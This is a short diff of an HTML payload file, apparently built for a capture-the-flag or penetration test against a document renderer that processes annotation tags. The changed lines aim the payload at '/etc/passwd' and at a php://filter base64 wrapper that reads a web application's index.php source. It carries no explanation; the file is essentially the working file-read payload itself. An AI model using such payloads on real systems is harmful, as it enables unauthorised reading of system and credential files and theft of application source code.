@@ -2,12 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Payload - Read Source Code</title>
+    <title>Payload - Target Locked</title>
 </head>
 <body>
-    <h1>Trying to fetch Source Code</h1>
+    <h1>Testing Exact Paths</h1>
     
-    <annotation file="php://filter/read=convert.base64-encode/resource=/var/www/html/index.php" content="Source1" icon="Graph" title="Index_PHP"></annotation>
+    <annotation file="/etc/passwd" content="Passwd" icon="Graph" title="Passwd_Test"></annotation>
+    
+    <annotation file="php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" content="Source" icon="Graph" title="Source_Test"></annotation>
     
 </body>
 </html>
